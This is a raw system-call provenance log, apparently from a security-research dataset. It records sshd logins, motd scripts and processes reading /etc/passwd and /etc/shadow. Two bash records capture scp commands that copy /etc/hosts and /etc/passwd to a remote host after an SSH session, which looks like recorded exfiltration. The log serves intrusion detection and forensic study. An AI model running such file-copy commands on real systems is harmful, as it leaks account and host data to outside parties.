1557659951.830:1353889372,3B735758-90A4-06D6-6A48-133B010E56CE:sshd,EXECUTE,8C558CD0-F3A6-6253-451C-0F2C5D50A18F,sshd,ta1-trace-2
1557659951.830:1353889351,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,3B735758-90A4-06D6-6A48-133B010E56CE,sshd,ta1-trace-2
1557659898.673:1353755260,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659898.673:1353755185,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659898.673:1353755093,E92F3B7A-AD6F-9FFB-2315-131BB35041E7:sshd,CHANGE_PRINCIPAL,17EBDEE8-6620-7340-A696-BA5A4A8FE48A,sshd,ta1-trace-2
1557659898.673:1353755092,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,CHANGE_PRINCIPAL,E92F3B7A-AD6F-9FFB-2315-131BB35041E7,sshd,ta1-trace-2
1557659895.717:1353323761,EC07B043-E320-B2AA-2E22-C602B1EB860E:bash,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.717:1353323678,6F8977A8-FF57-1DB0-4B79-9549CCF05733:sshd,EXECUTE,EC07B043-E320-B2AA-2E22-C602B1EB860E,bash,ta1-trace-2
1557659895.717:1353323565,E055B14B-E07E-5236-1C77-8FED81BF41D7:sshd,FORK,6F8977A8-FF57-1DB0-4B79-9549CCF05733,sshd,ta1-trace-2
1557659895.717:1353323519,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.717:1353323513,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.713:1353323493,4D48C90F-22C9-6262-580C-EAD154F3B853:sshd,CHANGE_PRINCIPAL,E055B14B-E07E-5236-1C77-8FED81BF41D7,sshd,ta1-trace-2
1557659895.713:1353323471,748071F9-D4F2-2882-B418-0C85B20C3BA6:sshd,CHANGE_PRINCIPAL,4D48C90F-22C9-6262-580C-EAD154F3B853,sshd,ta1-trace-2
1557659895.713:1353323468,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,FORK,748071F9-D4F2-2882-B418-0C85B20C3BA6,sshd,ta1-trace-2
1557659895.713:1353323459,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.713:1353323423,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.713:1353323420,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.713:1353323417,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.713:1353323341,C39E78EE-4872-75F3-9FDF-DD7FBA199899:update-motd-fsc,EXECUTE,CB84C91F-B267-C820-C51F-F8B054553E60,cat,ta1-trace-2
1557659895.713:1353323339,38D79CF0-BB50-4574-FBD7-020A9CA74C16:update-motd-fsc,FORK,C39E78EE-4872-75F3-9FDF-DD7FBA199899,update-motd-fsc,ta1-trace-2
1557659895.709:1353323122,AE4C9E64-A3F8-A49D-7B76-C52A58963C51:98-fsck-at-rebo,EXECUTE,38D79CF0-BB50-4574-FBD7-020A9CA74C16,update-motd-fsc,ta1-trace-2
1557659895.709:1353323092,685F46B5-DB99-D243-2975-445214959129:run-parts,EXECUTE,AE4C9E64-A3F8-A49D-7B76-C52A58963C51,98-fsck-at-rebo,ta1-trace-2
1557659895.709:1353323089,E1D188D6-B115-103B-823D-C9042AF38D81:run-parts,FORK,685F46B5-DB99-D243-2975-445214959129,run-parts,ta1-trace-2
1557659895.709:1353323027,E7771F34-D24E-9790-1754-34E6320BEF5D:update-motd-hwe,EXECUTE,D9D7A778-1E91-B09A-03CF-1C5EAD695569,cat,ta1-trace-2
1557659895.709:1353323025,D36D3ECC-D4DF-86D1-074F-696B2DE2D733:update-motd-hwe,FORK,E7771F34-D24E-9790-1754-34E6320BEF5D,update-motd-hwe,ta1-trace-2
1557659895.685:1353321650,DEC559E1-8EE9-638F-521E-67C40EB14A79:95-hwe-eol,EXECUTE,D36D3ECC-D4DF-86D1-074F-696B2DE2D733,update-motd-hwe,ta1-trace-2
1557659895.685:1353321629,B1E0159D-B0AD-C84B-AC22-646B67A66992:run-parts,EXECUTE,DEC559E1-8EE9-638F-521E-67C40EB14A79,95-hwe-eol,ta1-trace-2
1557659895.685:1353321628,E1D188D6-B115-103B-823D-C9042AF38D81:run-parts,FORK,B1E0159D-B0AD-C84B-AC22-646B67A66992,run-parts,ta1-trace-2
1557659895.665:1353321233,E0CF6957-7EFA-8E45-D346-4882782F0BC2:lsb_release,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.657:1353320966,299947C2-86BE-0169-A9DB-C3711A88A6B3:91-release-upgr,EXECUTE,E0CF6957-7EFA-8E45-D346-4882782F0BC2,lsb_release,ta1-trace-2
1557659895.657:1353320959,054B3BD8-BC01-0637-E6BD-B58F464994D2:91-release-upgr,FORK,299947C2-86BE-0169-A9DB-C3711A88A6B3,91-release-upgr,ta1-trace-2
1557659895.657:1353320952,76EBC6A6-146D-87BB-6C0C-9E2099F7ED40:91-release-upgr,FORK,054B3BD8-BC01-0637-E6BD-B58F464994D2,91-release-upgr,ta1-trace-2
1557659895.653:1353320930,A3FCBA0E-DB68-7C63-1308-45C3FE311710:run-parts,EXECUTE,76EBC6A6-146D-87BB-6C0C-9E2099F7ED40,91-release-upgr,ta1-trace-2
1557659895.653:1353320929,E1D188D6-B115-103B-823D-C9042AF38D81:run-parts,FORK,A3FCBA0E-DB68-7C63-1308-45C3FE311710,run-parts,ta1-trace-2
1557659895.653:1353320903,F73FFB5E-86E6-5774-3718-ACC06F6DAE1F:update-motd-upd,EXECUTE,2003E72A-39EB-BAC0-A9B2-07E6638BE4CA,cat,ta1-trace-2
1557659895.653:1353320901,F40EDF9B-9528-B9A9-FC92-E85F8EFE5ACF:update-motd-upd,FORK,F73FFB5E-86E6-5774-3718-ACC06F6DAE1F,update-motd-upd,ta1-trace-2
1557659895.637:1353319836,4ABAD5F6-93F7-FA48-3DF9-87A7CF8E302C:90-updates-avai,EXECUTE,F40EDF9B-9528-B9A9-FC92-E85F8EFE5ACF,update-motd-upd,ta1-trace-2
1557659895.637:1353319815,49FB77F6-5B55-E67E-B0F7-7E34508700A7:run-parts,EXECUTE,4ABAD5F6-93F7-FA48-3DF9-87A7CF8E302C,90-updates-avai,ta1-trace-2
1557659895.637:1353319814,E1D188D6-B115-103B-823D-C9042AF38D81:run-parts,FORK,49FB77F6-5B55-E67E-B0F7-7E34508700A7,run-parts,ta1-trace-2
1557659895.497:1353311974,8B9A5DE4-AC4F-1417-16C4-F9C23AB1B9D3:landscape-sysin,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.489:1353311586,35D99AF4-AE59-B77E-0AF6-5162F605BC5D:50-landscape-sy,EXECUTE,8B9A5DE4-AC4F-1417-16C4-F9C23AB1B9D3,landscape-sysin,ta1-trace-2
1557659895.485:1353311569,F21DF471-490E-BDCE-C778-66B40B69DCC2:50-landscape-sy,FORK,35D99AF4-AE59-B77E-0AF6-5162F605BC5D,50-landscape-sy,ta1-trace-2
1557659895.481:1353311326,F3E549AB-9645-8804-E009-7824DC9320B2:run-parts,EXECUTE,F21DF471-490E-BDCE-C778-66B40B69DCC2,50-landscape-sy,ta1-trace-2
1557659895.481:1353311285,E1D188D6-B115-103B-823D-C9042AF38D81:run-parts,FORK,F3E549AB-9645-8804-E009-7824DC9320B2,run-parts,ta1-trace-2
1557659895.465:1353310551,F54CEB40-8228-B1A9-9C67-BBAEA5ED72E8:env,EXECUTE,E1D188D6-B115-103B-823D-C9042AF38D81,run-parts,ta1-trace-2
1557659895.461:1353310490,04214AA7-303A-701E-0F3B-9E7186C32383:sh,EXECUTE,F54CEB40-8228-B1A9-9C67-BBAEA5ED72E8,env,ta1-trace-2
1557659895.461:1353310489,DE54E80D-A1A0-E3AD-5328-0C3B69E1C36E:sh,FORK,04214AA7-303A-701E-0F3B-9E7186C32383,sh,ta1-trace-2
1557659895.461:1353310444,E14BFE2B-B345-AAAE-FE79-B34ECB10473E:sshd,EXECUTE,DE54E80D-A1A0-E3AD-5328-0C3B69E1C36E,sh,ta1-trace-2
1557659895.461:1353310414,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,FORK,E14BFE2B-B345-AAAE-FE79-B34ECB10473E,sshd,ta1-trace-2
1557659895.461:1353310391,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.441:1353309985,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.441:1353309928,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.441:1353309916,BC749D07-3789-6A58-BE20-632B118D30A3:sshd,CHANGE_PRINCIPAL,17EBDEE8-6620-7340-A696-BA5A4A8FE48A,sshd,ta1-trace-2
1557659895.441:1353309915,B5D10595-0D0E-CBB8-3011-AD10CE88F5C8:sshd,CHANGE_PRINCIPAL,BC749D07-3789-6A58-BE20-632B118D30A3,sshd,ta1-trace-2
1557659895.441:1353309914,BC749D07-3789-6A58-BE20-632B118D30A3:sshd,CHANGE_PRINCIPAL,B5D10595-0D0E-CBB8-3011-AD10CE88F5C8,sshd,ta1-trace-2
1557659895.441:1353309913,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,CHANGE_PRINCIPAL,BC749D07-3789-6A58-BE20-632B118D30A3,sshd,ta1-trace-2
1557659895.441:1353309911,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.441:1353309897,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.437:1353309856,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557659895.437:1353309853,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.429:1353309823,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557659895.429:1353309820,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.325:1353309373,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.325:1353309341,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557659895.325:1353309340,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557659895.261:1353308986,17EBDEE8-6620-7340-A696-BA5A4A8FE48A:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659895.253:1353308730,217DBED8-4F0E-14FB-2DDA-DE8A6697411B:sshd,EXECUTE,17EBDEE8-6620-7340-A696-BA5A4A8FE48A,sshd,ta1-trace-2
1557659895.253:1353308709,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,217DBED8-4F0E-14FB-2DDA-DE8A6697411B,sshd,ta1-trace-2
1557659821.332:1353143956,10B1249C-515E-72B2-9615-0335B807AE29:mandb,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659821.332:1353143919,10B1249C-515E-72B2-9615-0335B807AE29:mandb,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659821.332:1353143876,10B1249C-515E-72B2-9615-0335B807AE29:mandb,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557659821.332:1353143873,10B1249C-515E-72B2-9615-0335B807AE29:mandb,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659821.328:1353143673,4B95340D-7848-3503-58C0-535D2161CF9E:null,CHANGE_PRINCIPAL,10B1249C-515E-72B2-9615-0335B807AE29,mandb,ta1-trace-2
1557659660.407:1352784957,217D4453-119E-5831-284B-1B43A4F4D21F:resolvconf,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659660.403:1352784889,44E3FE88-9639-3798-6575-C02D115AA521:dhclient-script,EXECUTE,217D4453-119E-5831-284B-1B43A4F4D21F,resolvconf,ta1-trace-2
1557659660.403:1352784883,AA3C70E6-1746-FFEB-235D-01095D9F1BEC:dhclient-script,FORK,44E3FE88-9639-3798-6575-C02D115AA521,dhclient-script,ta1-trace-2
1557659660.391:1352784693,AA3C70E6-1746-FFEB-235D-01095D9F1BEC:dhclient-script,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659660.391:1352784609,C64B84D0-C59F-979F-D7BB-BDAEEEE44A51:mandb,EXECUTE,AA3C70E6-1746-FFEB-235D-01095D9F1BEC,dhclient-script,ta1-trace-2
1557659660.391:1352784608,E823F003-22B3-C94B-224B-D2D344047643:null,CHANGE_PRINCIPAL,C64B84D0-C59F-979F-D7BB-BDAEEEE44A51,mandb,ta1-trace-2
1557659642.102:1352742036,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659642.102:1352741939,C44DAAAA-0CFC-AE97-35A3-0CF13922993A:sshd,CHANGE_PRINCIPAL,6D9EF505-689D-69B1-DBD1-5E3202C84289,sshd,ta1-trace-2
1557659642.102:1352741938,C44DAAAA-0CFC-AE97-35A3-0CF13922993A:sshd,CHANGE_PRINCIPAL,C44DAAAA-0CFC-AE97-35A3-0CF13922993A,sshd,ta1-trace-2
1557659642.102:1352741937,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,CHANGE_PRINCIPAL,C44DAAAA-0CFC-AE97-35A3-0CF13922993A,sshd,ta1-trace-2
1557659642.102:1352741877,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.986:1352738951,55A6EE67-C65B-AAEE-21B7-71CCEF9AF295:scp,READ,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737947,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737944,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737941,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737938,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737935,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737932,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.506:1352737929,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.502:1352737882,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.498:1352737786,905584B0-3BCC-2FA2-A12E-B1F368F44352:scp,EXECUTE,DDCFA248-E8C2-7EEE-E607-1427EEFDCDE4,ssh,ta1-trace-2
1557659640.498:1352737777,55A6EE67-C65B-AAEE-21B7-71CCEF9AF295:scp,FORK,905584B0-3BCC-2FA2-A12E-B1F368F44352,scp,ta1-trace-2
1557659640.498:1352737770,55A6EE67-C65B-AAEE-21B7-71CCEF9AF295:scp,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659640.498:1352737709,E34FB570-1105-58CB-8884-61BAFFF3B258:bash,EXECUTE,55A6EE67-C65B-AAEE-21B7-71CCEF9AF295,b'scp -r /etc/passwd admin@128.55.12.109:\\C:UsersadminDocuments',ta1-trace-2
1557659640.498:1352737699,DCEC7AEE-A4D7-F553-0924-B68536B688EA:bash,FORK,E34FB570-1105-58CB-8884-61BAFFF3B258,bash,ta1-trace-2
1557659638.386:1352732262,D1EB8697-056F-4EA3-5A93-A382B3DF7DAF:scp,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557659636.882:1352727391,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727388,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727385,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727382,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727379,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727376,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727373,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.882:1352727351,61370466-210A-DF80-3A16-3F404399709A:ssh,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.878:1352727242,DADF58A4-61BF-6E3A-D179-F81480A7305A:scp,EXECUTE,61370466-210A-DF80-3A16-3F404399709A,ssh,ta1-trace-2
1557659636.878:1352727229,D1EB8697-056F-4EA3-5A93-A382B3DF7DAF:scp,FORK,DADF58A4-61BF-6E3A-D179-F81480A7305A,scp,ta1-trace-2
1557659636.878:1352727221,D1EB8697-056F-4EA3-5A93-A382B3DF7DAF:scp,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.874:1352727155,0AB1C211-CC5E-5EFE-4AA1-218B791F0B9E:bash,EXECUTE,D1EB8697-056F-4EA3-5A93-A382B3DF7DAF,b'scp -r /etc/hosts admin@128.55.12.109:.',ta1-trace-2
1557659636.874:1352727149,DCEC7AEE-A4D7-F553-0924-B68536B688EA:bash,FORK,0AB1C211-CC5E-5EFE-4AA1-218B791F0B9E,bash,ta1-trace-2
1557659636.698:1352723992,DCEC7AEE-A4D7-F553-0924-B68536B688EA:bash,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.698:1352723909,47CC4471-D7EC-1A2C-0961-A4119A6047DF:sshd,EXECUTE,DCEC7AEE-A4D7-F553-0924-B68536B688EA,bash,ta1-trace-2
1557659636.694:1352723792,D307D8F0-2DA3-2695-B708-9EAF86A506FD:sshd,FORK,47CC4471-D7EC-1A2C-0961-A4119A6047DF,sshd,ta1-trace-2
1557659636.694:1352723746,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.694:1352723740,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.694:1352723718,910A470B-5234-226D-91CF-9DB5124C5E14:sshd,CHANGE_PRINCIPAL,D307D8F0-2DA3-2695-B708-9EAF86A506FD,sshd,ta1-trace-2
1557659636.694:1352723687,424E29E8-2F54-CAE5-997A-D2508D34350A:sshd,CHANGE_PRINCIPAL,910A470B-5234-226D-91CF-9DB5124C5E14,sshd,ta1-trace-2
1557659636.694:1352723681,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,FORK,424E29E8-2F54-CAE5-997A-D2508D34350A,sshd,ta1-trace-2
1557659636.694:1352723667,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.694:1352723627,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.694:1352723623,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.694:1352723620,6D9EF505-689D-69B1-DBD1-5E3202C84289:sshd,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.690:1352723544,C8935976-FE7C-15FC-CD27-1DDA45409577:update-motd-fsc,EXECUTE,814C26DE-828E-0BE2-7A92-CD9D4F38424B,cat,ta1-trace-2
1557659636.690:1352723542,D26FA63D-EBE3-4D73-A7FC-BA718853D111:update-motd-fsc,FORK,C8935976-FE7C-15FC-CD27-1DDA45409577,update-motd-fsc,ta1-trace-2
1557659636.690:1352723323,3C306B07-8BF1-E023-BBE6-2BC79F3D64A2:98-fsck-at-rebo,EXECUTE,D26FA63D-EBE3-4D73-A7FC-BA718853D111,update-motd-fsc,ta1-trace-2
1557659636.690:1352723301,2CFCB440-A7EF-9953-0A04-8827ED2B4BAD:run-parts,EXECUTE,3C306B07-8BF1-E023-BBE6-2BC79F3D64A2,98-fsck-at-rebo,ta1-trace-2
1557659636.690:1352723300,D987BD4E-43AC-415C-7AEF-AFE3C3131890:run-parts,FORK,2CFCB440-A7EF-9953-0A04-8827ED2B4BAD,run-parts,ta1-trace-2
1557659636.690:1352723251,53E16317-18C2-0387-2228-6456EEF74FEE:update-motd-hwe,EXECUTE,473A8A6F-A512-2AE3-E084-B5B2829EA6F9,cat,ta1-trace-2
1557659636.690:1352723249,15DFF5B8-21EB-48AF-A130-77DFFD9F3C71:update-motd-hwe,FORK,53E16317-18C2-0387-2228-6456EEF74FEE,update-motd-hwe,ta1-trace-2
1557659636.670:1352721878,7CBAD9DD-8E07-338F-E0CB-460064B652F6:95-hwe-eol,EXECUTE,15DFF5B8-21EB-48AF-A130-77DFFD9F3C71,update-motd-hwe,ta1-trace-2
1557659636.670:1352721855,822D79A2-185A-59D7-12AE-581428B91C14:run-parts,EXECUTE,7CBAD9DD-8E07-338F-E0CB-460064B652F6,95-hwe-eol,ta1-trace-2
1557659636.670:1352721851,D987BD4E-43AC-415C-7AEF-AFE3C3131890:run-parts,FORK,822D79A2-185A-59D7-12AE-581428B91C14,run-parts,ta1-trace-2
1557659636.650:1352721463,24D92260-44C0-B37A-6D0B-E2091E7235BF:lsb_release,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.638:1352721195,E736CDA9-D71A-49F2-3A00-A80A6D6EF1B4:91-release-upgr,EXECUTE,24D92260-44C0-B37A-6D0B-E2091E7235BF,lsb_release,ta1-trace-2
1557659636.638:1352721186,22AAE3DB-E426-4686-5110-AEA46D5C378A:91-release-upgr,FORK,E736CDA9-D71A-49F2-3A00-A80A6D6EF1B4,91-release-upgr,ta1-trace-2
1557659636.638:1352721179,45334A5A-27E2-AD9A-BA52-D96F125091EE:91-release-upgr,FORK,22AAE3DB-E426-4686-5110-AEA46D5C378A,91-release-upgr,ta1-trace-2
1557659636.638:1352721157,51055D4E-BEBE-9035-E8D6-E1D2B75C55E9:run-parts,EXECUTE,45334A5A-27E2-AD9A-BA52-D96F125091EE,91-release-upgr,ta1-trace-2
1557659636.638:1352721156,D987BD4E-43AC-415C-7AEF-AFE3C3131890:run-parts,FORK,51055D4E-BEBE-9035-E8D6-E1D2B75C55E9,run-parts,ta1-trace-2
1557659636.638:1352721130,4B9AAB36-778F-B771-5340-B9B7CEA9DA93:update-motd-upd,EXECUTE,B3C7DF97-FE96-B47E-812E-23464EAF581C,cat,ta1-trace-2
1557659636.638:1352721128,8A018CA7-D013-7E3A-B350-D7A9BC8D78E7:update-motd-upd,FORK,4B9AAB36-778F-B771-5340-B9B7CEA9DA93,update-motd-upd,ta1-trace-2
1557659636.622:1352720067,7763D84B-9A1F-479C-58AD-11290884B233:90-updates-avai,EXECUTE,8A018CA7-D013-7E3A-B350-D7A9BC8D78E7,update-motd-upd,ta1-trace-2
1557659636.622:1352720046,99AA33B4-5E09-151B-FC5A-C12B71E0C5AE:run-parts,EXECUTE,7763D84B-9A1F-479C-58AD-11290884B233,90-updates-avai,ta1-trace-2
1557659636.622:1352720045,D987BD4E-43AC-415C-7AEF-AFE3C3131890:run-parts,FORK,99AA33B4-5E09-151B-FC5A-C12B71E0C5AE,run-parts,ta1-trace-2
1557659636.482:1352712794,6A4C98E3-9B60-E3DF-B443-C69BA5BDD1B7:landscape-sysin,MMAP,46F742B2-048D-7502-BA37-1169354ED26B,/etc/passwd,ta1-trace-2
1557659636.470:1352712372,96C49258-EF15-D0A2-6501-8BF732F7D59D:50-landscape-sy,EXECUTE,6A4C98E3-9B60-E3DF-B443-C69BA5BDD1B7,landscape-sysin,ta1-trace-2
1557659636.470:1352712365,EBCECFFF-2404-7527-580D-B572779FF6C3:50-landscape-sy,FORK,96C49258-EF15-D0A2-6501-8BF732F7D59D,50-landscape-sy,ta1-trace-2
1557659636.466:1352712082,19694805-8A74-DC95-186B-6C2B1A68A187:run-parts,EXECUTE,EBCECFFF-2404-7527-580D-B572779FF6C3,50-landscape-sy,ta1-trace-2
1557659636.466:1352712079,D987BD4E-43AC-415C-7AEF-AFE3C3131890:run-parts,FORK,19694805-8A74-DC95-186B-6C2B1A68A187,run-parts,ta1-trace-2
